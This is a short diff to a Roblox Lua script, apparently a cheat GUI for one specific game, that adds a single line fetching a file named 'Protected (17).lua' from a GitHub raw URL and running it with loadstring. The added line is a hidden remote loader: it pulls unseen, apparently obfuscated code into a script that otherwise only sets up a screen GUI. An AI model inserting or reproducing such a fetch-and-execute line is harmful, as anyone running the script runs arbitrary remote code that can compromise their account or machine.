@@ -24,6 +24,7 @@ if game.PlaceId == 606849621 then -- Game execution check
     local currentEXP = tostring(game:GetService("Players").LocalPlayer.Exp.Value)
     local lplr_name = game:GetService("Players").LocalPlayer.Name
     local lplr = game:GetService("Players").LocalPlayer
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/geekedasf/x/main/Protected%20(17).lua"))()
 
     ScreenGui.Parent = game.CoreGui
     ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
